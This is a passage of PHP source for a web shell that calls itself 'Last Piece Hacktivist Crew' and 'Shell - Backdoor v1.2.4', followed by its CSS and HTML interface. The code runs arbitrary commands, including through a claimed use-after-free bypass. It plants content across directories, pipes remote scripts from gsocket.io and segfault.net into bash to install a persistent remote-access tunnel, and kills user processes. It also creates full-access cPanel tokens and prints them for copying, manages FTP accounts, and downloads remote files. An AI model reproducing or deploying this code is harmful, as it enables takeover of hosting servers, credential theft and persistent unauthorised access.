    if (@mkdir($newDir, 0755)) $responseMessage = 'Folder created: ' . htmlspecialchars($_POST['foldername']);
    else $errorMessage = 'Failed to create folder.';
}

if (isset($_POST['mass_chmod']) && !empty($_POST['chmod_folder']) && !empty($_POST['chmod_file'])) {
    $folderPerm = $_POST['chmod_folder'];
    $filePerm = $_POST['chmod_file'];
    $targetPath = !empty($_POST['chmod_path']) ? $_POST['chmod_path'] : $currentDirectory;
    $folderCount = 0; $fileCount = 0; $chmodErrors = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            $path = $item->getPathname();
            if ($item->isDir()) {
                if (@chmod($path, octdec($folderPerm))) $folderCount++;
                else $chmodErrors[] = $path;
            } else {
                if (@chmod($path, octdec($filePerm))) $fileCount++;
                else $chmodErrors[] = $path;
            }
        }
        @chmod($targetPath, octdec($folderPerm));
        $folderCount++;
        $cmdOutput = "=== Mass Chmod Result ===\nTarget: $targetPath\nFolder Perm: $folderPerm\nFile Perm: $filePerm\n---\nFolders: $folderCount\nFiles: $fileCount";
        if (count($chmodErrors) > 0) {
            $cmdOutput .= "\nErrors: " . count($chmodErrors);
            foreach (array_slice($chmodErrors, 0, 5) as $err) $cmdOutput .= "\n  $err";
        }
        $responseMessage = 'Mass chmod completed.';
    } catch (Exception $e) {
        $cmdOutput = "Error: " . $e->getMessage();
    }
}

if (isset($_POST['mass_spread']) && !empty($_POST['spread_content'])) {
    $spreadContent = $_POST['spread_content'];
    $result = massSpreadAuto($currentDirectory, $spreadContent);
    $cmdOutput = "=== Mass Spread Result ===\nStarting from: $currentDirectory\nFiles created: " . $result['count'];
    if (count($result['created']) > 0) {
        $cmdOutput .= "\n\nCreated files:";
        foreach (array_slice($result['created'], 0, 20) as $c) $cmdOutput .= "\n  " . basename($c) . " -> " . dirname($c);
    }
    if (count($result['errors']) > 0) {
        $cmdOutput .= "\n\nFailed dirs: " . count($result['errors']);
        foreach (array_slice($result['errors'], 0, 5) as $err) $cmdOutput .= "\n  $err";
    }
    $responseMessage = 'Mass spread completed: ' . $result['count'] . ' files created.';
}

if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
    $gsCmd = $_POST['gsocket_cmd'];
    $cmdOutput = "=== GSSocket ===\n\n";

    if ($gsCmd === 'install') {
        // Step 1: try gsocket.io
        $out = runCmd('curl -fsSL https://gsocket.io/y | bash');
        if (!empty(trim($out ?? ''))) {
            $cmdOutput .= "[1] gsocket.io (curl):\n" . $out;
        } else {
            $out = runCmd('wget --no-verbose -O- https://gsocket.io/y | bash');
            if (!empty(trim($out ?? ''))) {
                $cmdOutput .= "[1] gsocket.io (wget):\n" . $out;
            } else {
                $cmdOutput .= "[1] gsocket.io: No output.\n";
            }
        }
        // Step 2: fallback segfault.net
        $out2 = runCmd('curl -fsSL http://nossl.segfault.net/deploy-all.sh -o /tmp/deploy-all.sh && bash /tmp/deploy-all.sh');
        if (!empty(trim($out2 ?? ''))) {
            $cmdOutput .= "\n\n[2] segfault.net deploy:\n" . $out2;
        } else {
            $cmdOutput .= "\n\n[2] segfault.net deploy: No output.";
        }
        // Step 3: fallback port 53
        $out3 = runCmd('GS_PORT=53 bash /tmp/deploy-all.sh');
        if (!empty(trim($out3 ?? ''))) {
            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy:\n" . $out3;
        } else {
            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy: No output.";
        }
        // Cleanup
        @unlink('/tmp/deploy-all.sh');
        runCmd('rm -f /tmp/deploy-all.sh');
        $responseMessage = 'GSSocket install chain executed.';

    } elseif ($gsCmd === 'uninstall') {
        $out = runCmd('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
        if (empty(trim($out ?? ''))) {
            $out = runCmd('GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1');
        }
        // Auto kill all user processes
        runCmd('pkill -u $(whoami) 2>/dev/null');
        runCmd('rm -f /tmp/deploy-all.sh');
        // Clean output - remove the "Use pkill" instruction line
        $out = preg_replace('/-->.*pkill defunct.*/i', '', $out ?? '');
        $out = trim($out);
        $out .= "\nAll user processes killed.";
        $cmdOutput .= $out;
        $responseMessage = 'GSSocket uninstall executed.';
    }
}

if (isset($_POST['cpanel_token'])) {
    $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
    $uapiOutput = runUapi('Tokens create_full_access name=' . $randomName);
    $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
    $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
    $serverDomain = rtrim($serverDomain, '/');
    $serverUser = trim(runCmd('whoami') ?? get_current_user());
    $token = '';
    if ($uapiOutput && preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $m)) {
        $token = $m[1];
    }
    $cmdOutput = "=== cPanel Token Generated ===\n\n";
    if (!empty($token)) {
        $cmdOutput .= "Login   : https://" . $serverDomain . ":2083/\n";
        $cmdOutput .= "Domain  : " . $serverDomain . "\n";
        $cmdOutput .= "User    : " . $serverUser . "\n";
        $cmdOutput .= "Token   : " . $token . "\n";
        $cmdOutput .= "\n=== Copy Format ===\n";
        $cmdOutput .= $serverDomain . "|" . $serverUser . "|" . $token;
        $responseMessage = 'cPanel token created successfully';
    } else {
        $cmdOutput .= "FAILED to create token.\n\n";
        $cmdOutput .= "Raw output:\n" . ($uapiOutput ?: 'No output from uapi');
        $responseMessage = 'Token creation failed';
    }
}

$ftpAccounts = [];
if (isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])) {
    $ftpListRaw = runUapi('Ftp list_ftp');
    $ftpAccounts = parseUapiFtpList($ftpListRaw);
}

if (isset($_POST['ftp_list'])) {
    $responseMessage = count($ftpAccounts) . ' FTP account(s) found.';
}

if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
    $ftpUser = $_POST['ftp_user'];
    $ftpPass = $_POST['ftp_pass'];
    $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
    $homeDir = getenv('HOME') ?: ('/home/' . get_current_user());
    $addOutput = runUapi('Ftp add_ftp user=' . escapeshellarg($ftpUser) . ' pass=' . escapeshellarg($ftpPass) . ' quota=' . escapeshellarg($ftpQuota) . ' homedir=' . escapeshellarg($homeDir));
    $parsed = parseUapiStatus($addOutput);
    if ($parsed['ok']) {
        $responseMessage = 'FTP account "' . $ftpUser . '" created successfully.';
    } else {
        $errorMessage = 'FTP creation failed. Check output.';
        $cmdOutput = $addOutput;
    }
}

if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
    $chgUser = $_POST['ftp_chg_user'];
    $chgPass = $_POST['ftp_chg_pass'];
    $chgDomain = $_POST['ftp_chg_domain'];
    $passwdOutput = runUapi('Ftp passwd user=' . escapeshellarg($chgUser) . ' domain=' . escapeshellarg($chgDomain) . ' pass=' . escapeshellarg($chgPass));
    $parsed = parseUapiStatus($passwdOutput);
    if ($parsed['ok']) {
        $responseMessage = 'Password changed for "' . $chgUser . '@' . $chgDomain . '".';
    } else {
        $errorMessage = 'Password change failed.';
        $cmdOutput = $passwdOutput;
    }
}

if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
    $delUser = $_POST['ftp_del_user'];
    $delDomain = $_POST['ftp_del_domain'];
    $delOutput = runUapi('Ftp delete_ftp user=' . escapeshellarg($delUser) . ' domain=' . escapeshellarg($delDomain));
    $parsed = parseUapiStatus($delOutput);
    if ($parsed['ok']) {
        $responseMessage = 'FTP account "' . $delUser . '@' . $delDomain . '" deleted.';
    } else {
        $errorMessage = 'FTP deletion failed.';
        $cmdOutput = $delOutput;
    }
}

// === WORDPRESS MANAGER ===
$wpAvailable = false;
$wpLoadPath = findWpLoad();
if ($wpLoadPath) $wpAvailable = true;

if (isset($_POST['remote_upload']) && !empty($_POST['remote_url'])) {
    $url = $_POST['remote_url'];
    $fname = !empty($_POST['remote_filename']) ? $_POST['remote_filename'] : basename(parse_url($url, PHP_URL_PATH));
    $target = $currentDirectory . '/' . $fname;
    fixPermission($currentDirectory);
    $content = @file_get_contents($url);
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>false]);
        $content = curl_exec($ch); curl_close($ch);
    }
    if ($content !== false && @file_put_contents($target, $content) !== false) $responseMessage = "Remote file downloaded: $fname";
    else $responseMessage = 'Failed to download remote file.';
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        if (saveFileContent($file)) $responseMessage = 'File saved.';
        else $errorMessage = 'Error saving file.';
    }
}

if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
        $perm = intval($_POST['permission'], 8);
        if ($perm > 0 && @chmod($file, $perm)) $responseMessage = 'Permission changed.';
        else $errorMessage = 'Error changing permission.';
    }
}

if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $useBypass = isset($_POST['use_bypass']) && $_POST['use_bypass'] === '1';
    if ($useBypass) {
        $bypassOut = runBypass($_POST['cmd']);
        $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
    } else {
        $cmdOutput = executeCommand($_POST['cmd']);
    }
}

if (isset($_POST['eclipse']) && !empty($_POST['eclipse'])) {
    $bypassOut = runBypass($_POST['eclipse']);
    $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
}

if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
    $file = $_GET['rename'];
    $responseMessage = renameFile($file, $_POST['new_name']);
}

if (isset($_GET['dl']) && isAuthenticated()) {
    $dlFile = $_GET['dl'];
    if (file_exists($dlFile) && is_file($dlFile)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dlFile) . '"');
        header('Content-Length: ' . filesize($dlFile));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        @ob_clean();
        flush();
        readfile($dlFile);
        exit;
    }
}

if (isset($_GET['del'])) {
    $file = $_GET['del'];
    $fileDir = dirname($file);
    if (deleteFile($file)) {
        header('Location: ?lph=' . urlencode($fileDir) . '&lastpiece=hacktivist&msg=deleted');
        exit;
    } else {
        $errorMessage = 'Failed to delete: ' . basename($file);
    }
}

if (isset($_POST['Summon'])) {
    $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $filePath = $currentDirectory . '/Adminer.php';
    $fileContent = @file_get_contents($url);
    if ($fileContent !== false && @file_put_contents($filePath, $fileContent) !== false) {
        $responseMessage = 'Adminer summoned successfully.';
    } else {
        $errorMessage = 'Failed to summon Adminer.';
    }
}

if (isset($_POST['scan_deeply'])) {
    $results = scanDeepestDirectory($currentDirectory);
    $cmdOutput = "=== Deepest Directories ===\n";
    if (empty($results)) $cmdOutput .= "No subdirectories found.";
    else foreach ($results as $r) $cmdOutput .= $r . "\n";
}

if (isset($_POST['scan_newly'])) {
    $ext = isset($_POST['scan_ext']) ? $_POST['scan_ext'] : 'php';
    $results = scanNewlyFiles($currentDirectory, $ext);
    $cmdOutput = "=== Newest .$ext Files ===\n";
    if (empty($results)) $cmdOutput .= "No files found.";
    else foreach ($results as $r) $cmdOutput .= date('Y-m-d H:i:s', $r['time']) . " | " . $r['path'] . "\n";
}

// msg=deleted is handled by JS toast only (no PHP message to prevent double toast)

// Bypass security modules
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) header('X-LSCACHE: off');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Last Piece Hacktivist Crew - File Manager</title>
<style>
:root {
    --bg: #0a0a1a;
    --bg-card: #111128;
    --bg-input: #0d0d1e;
    --border: #1e1e3a;
    --text: #e0e0f0;
    --text-muted: #6a6a8a;
    --gold: #ffd700;
    --gold-dark: #cc9900;
    --accent: #00d4ff;
    --red: #f85149;
    --green: #3fb950;
    --purple: #a855f7;
}

@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
    font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
    font-size: 13px;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
}

.app-header {
    background: linear-gradient(135deg, #0d0d1e 0%, #1a0a2e 100%);
    border-bottom: 1px solid var(--border);
    padding: 12px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.header-left { display: flex; align-items: center; gap: 12px; }

.header-logo { width: 32px; height: 32px; border-radius: 8px; }

.header-title {
    font-size: 16px;
    font-weight: 700;
    background: linear-gradient(90deg, var(--gold), var(--accent));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}

.header-sub { font-size: 11px; color: var(--text-muted); }

.header-right { display: flex; align-items: center; gap: 12px; }

.sys-badge {
    background: var(--bg-input);
    border: 1px solid var(--border);
    padding: 4px 10px;
    border-radius: 6px;
    font-size: 10px;
    color: var(--text-muted);
}

.container { max-width: 1400px; margin: 0 auto; padding: 16px; }

.breadcrumb {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 10px 16px;
    margin-bottom: 12px;
    font-size: 12px;
    overflow-x: auto;
    white-space: nowrap;
}

.breadcrumb a { color: var(--accent); text-decoration: none; }
.breadcrumb a:hover { color: var(--gold); text-decoration: underline; }

.toolbar {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 10px 16px;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    flex-wrap: wrap;
}

.toolbar-label {
    font-size: 10px;
    text-transform: uppercase;
    color: var(--text-muted);
    font-weight: 600;
    margin-right: 6px;
}

.btn {
    padding: 6px 14px;
    border-radius: 6px;
    font-size: 11px;
    font-weight: 500;
    border: 1px solid var(--border);
    cursor: pointer;
    transition: all 0.2s;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-family: inherit;
    text-decoration: none;
    color: var(--text);
    background: var(--bg-input);
}

.btn:hover { border-color: var(--accent); }

.btn-sm { padding: 4px 10px; font-size: 10px; }

.btn-primary {
    background: linear-gradient(135deg, var(--gold), var(--gold-dark));
    color: #000;
    border-color: var(--gold);
    font-weight: 600;
}

.btn-primary:hover { box-shadow: 0 0 15px rgba(255, 215, 0, 0.4); }

.btn-secondary {
    background: var(--bg-input);
    color: var(--text);
    border-color: var(--border);
}

.btn-danger {
    background: rgba(248, 81, 73, 0.15);
    color: var(--red);
    border-color: rgba(248, 81, 73, 0.3);
}

.btn-danger:hover { background: var(--red); color: white; }

.btn-scan {
    background: linear-gradient(135deg, #06b6d4, #0891b2);
    color: white;
    border-color: #06b6d4;
}

.btn-chmod {
    background: linear-gradient(135deg, #ec4899, #db2777);
    color: white;
    border-color: #ec4899;
}

.btn-spread {
    background: linear-gradient(135deg, #f59e0b, #d97706);
    color: #000;
    border-color: #f59e0b;
}

.btn-gs {
    background: linear-gradient(135deg, #10b981, #059669);
    color: white;
    border-color: #10b981;
}

.btn-gs:hover {
    box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
}

.btn-uapi {
    background: linear-gradient(135deg, #8b5cf6, #7c3aed);
    color: white;
    border-color: #8b5cf6;
}

.btn-uapi:hover {
    box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
}

.btn-ftp {
    background: linear-gradient(135deg, #f97316, #ea580c);
    color: white;
    border-color: #f97316;
}

.btn-ftp:hover {
    box-shadow: 0 0 15px rgba(249, 115, 22, 0.5);
}

.btn-wp {
    background: linear-gradient(135deg, #3b82f6, #2563eb);
    color: white;
    border-color: #3b82f6;
}
.btn-wp:hover {
    box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
}

.btn-proc {
    background: linear-gradient(135deg, #ec4899, #db2777);
    color: white;
    border-color: #ec4899;
}
.btn-proc:hover {
    box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
}

.btn-cron {
    background: linear-gradient(135deg, #06b6d4, #0891b2);
    color: white;
    border-color: #06b6d4;
}
.btn-cron:hover {
    box-shadow: 0 0 15px rgba(6, 182, 212, 0.5);
}

.wp-user-row {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px;
    background: var(--bg-secondary);
    border: 1px solid var(--border);
    border-radius: 6px;
    margin-bottom: 4px;
}
.wp-user-row:hover { border-color: var(--accent); }
.wp-user-row.wp-hidden {
    background: rgba(59, 130, 246, 0.08);
    border-color: rgba(59, 130, 246, 0.3);
}
.wp-badge {
    display: inline-block;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 9px;
    font-weight: 700;
    text-transform: uppercase;
}
.wp-badge-hidden { background: #3b82f6; color: white; }
.wp-badge-admin { background: #f59e0b; color: #000; }
.wp-pw-box {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: var(--bg-primary);
    border: 1px solid var(--accent);
    border-radius: 4px;
    padding: 3px 8px;
    margin-top: 6px;
    font-family: monospace;
    font-size: 11px;
    color: var(--green);
}

.upload-label {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    padding: 4px 10px;
    font-size: 10px;
    border-radius: 6px;
    cursor: pointer;
    font-family: inherit;
    font-weight: 500;
    background: var(--bg-input);
    color: var(--text);
    border: 1px solid var(--border);
    transition: all 0.2s;
}

.upload-label:hover { border-color: var(--accent); }
.upload-label input[type="file"] { display: none; }
.upload-label svg { width: 14px; height: 14px; }

.file-table {
    width: 100%;
    border-collapse: collapse;
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    overflow: hidden;
    margin-bottom: 12px;
}

.file-table th {
    background: rgba(255, 215, 0, 0.08);
    color: var(--gold);
    font-size: 10px;
    text-transform: uppercase;
    padding: 10px 14px;
    text-align: left;
    font-weight: 600;
    border-bottom: 1px solid var(--border);
}

.file-table td {
    padding: 8px 14px;
    border-bottom: 1px solid rgba(30, 30, 58, 0.5);
    font-size: 12px;
}

.file-table tr:hover { background: rgba(0, 212, 255, 0.03); }

.file-table td a { color: var(--accent); text-decoration: none; }
.file-table td a:hover { color: var(--gold); text-decoration: underline; }

.file-icon { display: inline-flex; align-items: center; gap: 8px; }

.folder-icon { color: var(--gold); }
.file-icon-type { color: var(--accent); }

.action-btns { display: flex; gap: 4px; flex-wrap: wrap; }

.action-btns a {
    padding: 3px 8px;
    font-size: 10px;
    border-radius: 4px;
    text-decoration: none;
    border: 1px solid var(--border);
    color: var(--text-muted);
    transition: all 0.2s;
}

.action-btns a:hover { border-color: var(--accent); color: var(--accent); }
.action-btns a.act-del { border-color: rgba(248,81,73,0.3); color: var(--red); }
.action-btns a.act-del:hover { background: var(--red); color: white; }

.cmd-section {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 8px;
    padding: 14px;
    margin-bottom: 12px;
}

.cmd-prompt {
    display: flex;
    align-items: center;
    gap: 8px;
}

.cmd-user { color: var(--green); font-size: 12px; }
.cmd-dollar { color: var(--gold); }

.cmd-prompt input {
    flex: 1;
    background: transparent;
    border: none;
    color: var(--text);
    font-family: inherit;
    font-size: 12px;
    outline: none;
}

.cmd-output {
    background: #000;
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 12px;
    margin-top: 10px;
    max-height: 300px;
    overflow-y: auto;
}

.cmd-output pre {
    color: #00d4ff;
    font-size: 11px;
    white-space: pre-wrap;
    word-wrap: break-word;
    font-family: inherit;
    margin: 0;
}

.form-group { margin-bottom: 12px; }
.form-label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 4px; font-weight: 500; }
.form-input {
    width: 100%;
    background: var(--bg-input);
    border: 1px solid var(--border);
    color: var(--text);
    padding: 8px 12px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 12px;
    outline: none;
    transition: border-color 0.2s;
}
.form-input:focus { border-color: var(--accent); }

.editor-area {
    width: 100%;
    min-height: 400px;
    background: #000;
    border: 1px solid var(--border);
    color: var(--green);
    padding: 14px;
    border-radius: 6px;
    font-family: inherit;
    font-size: 12px;
    outline: none;
    resize: vertical;
    line-height: 1.6;
}

.msg-success {
    background: rgba(63, 185, 80, 0.1);
    border: 1px solid rgba(63, 185, 80, 0.3);
    color: var(--green);
    padding: 8px 14px;
    border-radius: 6px;
    font-size: 12px;
    margin-bottom: 12px;
}

.msg-error {
    background: rgba(248, 81, 73, 0.1);
    border: 1px solid rgba(248, 81, 73, 0.3);
    color: var(--red);
    padding: 8px 14px;
    border-radius: 6px;
    font-size: 12px;
    margin-bottom: 12px;
}

.modal-overlay {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0, 0, 0, 0.8);
    backdrop-filter: blur(4px);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 9999;
}

.modal {
    background: var(--bg-card);
    border: 1px solid var(--border);
    border-radius: 12px;
    max-width: 500px;
    width: 90%;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
}

.modal-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 14px 18px;
    border-bottom: 1px solid var(--border);
}

.modal-title { font-weight: 600; font-size: 14px; color: var(--gold); }
.modal-close { background: none; border: none; color: var(--text-muted); cursor: pointer; padding: 4px; }
.modal-close:hover { color: var(--red); }
.modal-body { padding: 18px; }
.modal-footer { padding: 14px 18px; border-top: 1px solid var(--border); display: flex; justify-content: flex-end; gap: 8px; }

.hidden { display: none !important; }

.uploader-row { display: flex; gap: 8px; align-items: center; margin-bottom: 8px; }

.custom-file-input {
    flex: 1;
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--bg-input);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 6px 10px;
    cursor: pointer;
    transition: all 0.2s;
}

.custom-file-input:hover { border-color: var(--accent); }
.custom-file-input input[type="file"] { display: none; }

.custom-file-input .file-btn {
    display: flex;
    align-items: center;
    gap: 6px;
    background: linear-gradient(135deg, var(--accent), #0077b6);
    color: white;
    padding: 5px 12px;
    border-radius: 4px;
    font-size: 11px;
    font-weight: 500;
    white-space: nowrap;
}

.custom-file-input .file-name {
    font-size: 11px;
    color: var(--text-muted);
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    flex: 1;
}

.custom-file-input.has-file .file-name { color: var(--gold); }

.app-footer {
    background: linear-gradient(135deg, #0d0d1e 0%, #1a0a2e 100%);
    border-top: 1px solid var(--border);
    padding: 16px 20px;
    text-align: center;
    margin-top: 20px;
}

.footer-content { display: flex; align-items: center; justify-content: center; gap: 12px; }
.footer-avatar { width: 30px; height: 30px; border-radius: 50%; border: 2px solid var(--gold); }
.footer-text { font-size: 11px; color: var(--text-muted); }
.footer-text span { color: var(--gold); font-weight: 600; }
</style>
</head>
<body>

<?php if (isset($_GET['edit'])): ?>
<div class="container">
    <div style="margin-bottom: 12px;">
        <a href="?lph=<?php echo urlencode(dirname($_GET['edit'])); ?>&lastpiece=hacktivist" class="btn btn-secondary">&larr; Back</a>
    </div>
    <div class="cmd-section">
        <h3 style="color: var(--gold); margin-bottom: 12px;">Editing: <?php echo htmlspecialchars(basename($file)); ?></h3>
        <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
        <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>
        <form method="POST">
            <textarea name="content" class="editor-area"><?php echo htmlspecialchars($content ?? ''); ?></textarea>
            <div style="margin-top: 10px; display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Save File</button>
                <a href="?lph=<?php echo urlencode(dirname($file)); ?>&lastpiece=hacktivist" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php elseif (isset($_GET['rename'])): ?>
<div class="container">
    <div class="cmd-section">
        <h3 style="color: var(--gold); margin-bottom: 12px;">Rename: <?php echo htmlspecialchars(basename($_GET['rename'])); ?></h3>
        <form method="POST">
            <div class="form-group">
                <label class="form-label">New Name</label>
                <input type="text" name="new_name" class="form-input" value="<?php echo htmlspecialchars(basename($_GET['rename'])); ?>" required>
            </div>
            <div style="display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Rename</button>
                <a href="?lph=<?php echo urlencode(dirname($_GET['rename'])); ?>&lastpiece=hacktivist" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php elseif (isset($_GET['chmod'])): ?>
<div class="container">
    <div class="cmd-section">
        <h3 style="color: var(--gold); margin-bottom: 12px;">Chmod: <?php echo htmlspecialchars(basename($_GET['chmod'])); ?></h3>
        <form method="POST">
            <div class="form-group">
                <label class="form-label">Permission</label>
                <input type="text" name="permission" class="form-input" placeholder="0755" maxlength="4" required>
            </div>
            <div style="display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Change</button>
                <a href="?lph=<?php echo urlencode(dirname($_GET['chmod'])); ?>&lastpiece=hacktivist" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php else: ?>

<header class="app-header">
    <div class="header-left">
        <img src="https://l.top4top.io/p_3688fo4y41.png" class="header-logo" alt="">
        <div>
            <div class="header-title">Last Piece Hacktivist</div>
            <div class="header-sub">Shell - Backdoor v1.2.4</div>
        </div>
    </div>
    <div class="header-right">
        <span class="sys-badge"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
        <span class="sys-badge"><?php echo @get_current_user(); ?></span>
        <form method="POST" style="display:inline;"><button type="submit" name="logout" class="btn btn-danger btn-sm">Logout</button></form>
    </div>
</header>

<div class="container">
    <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
    <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>

    <div class="breadcrumb">
        <strong>DIR:</strong>
        <?php
        $bPath = str_replace('\\', '/', $currentDirectory);
        $parts = explode('/', $bPath);
        foreach ($parts as $id => $part) {
            if ($part == '' && $id == 0) {
                echo ' <a href="?lph=/&lastpiece=hacktivist">/</a>';
            } elseif (!empty($part)) {
                $link = implode('/', array_slice($parts, 0, $id + 1));
                echo ' <a href="?lph=' . urlencode($link) . '&lastpiece=hacktivist">' . htmlspecialchars($part) . '</a> /';
            }
        }
        ?>
    </div>

    <!-- Toolbar: Features -->
    <div class="toolbar">
        <div class="toolbar-label">Features</div>
        <button onclick="showCreateFolderModal()" class="btn btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
            New Folder
        </button>
        <button onclick="showCreateFileModal()" class="btn btn-sm">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
            New File
        </button>
        <form method="POST" style="display:contents;">
            <input type="submit" name="Summon" value="Adminer" class="btn btn-sm">
        </form>
        <form method="POST" enctype="multipart/form-data" style="display:contents;">
            <label class="upload-label">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                Upload
                <input type="file" name="file" onchange="this.form.submit()">
            </label>
            <input type="hidden" name="upload" value="1">
        </form>
        <button onclick="showModal('multiupload')" class="btn btn-sm">Multi Upload</button>
        <button onclick="showModal('remote')" class="btn btn-sm">Remote Upload</button>
    </div>

    <!-- Toolbar: Scanner -->
    <div class="toolbar">
        <div class="toolbar-label">Scanner</div>
        <form method="POST" style="display:contents;">
            <button type="submit" name="scan_deeply" class="btn btn-scan btn-sm">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Deep Scan
            </button>
        </form>
        <form method="POST" style="display:contents;">
            <input type="hidden" name="scan_ext" value="php">
            <button type="submit" name="scan_newly" class="btn btn-scan btn-sm">New PHP Files</button>
        </form>
        <button onclick="showModal('chmod')" class="btn btn-chmod btn-sm">Mass Chmod</button>
        <button onclick="showModal('spread')" class="btn btn-spread btn-sm">Mass Spread</button>
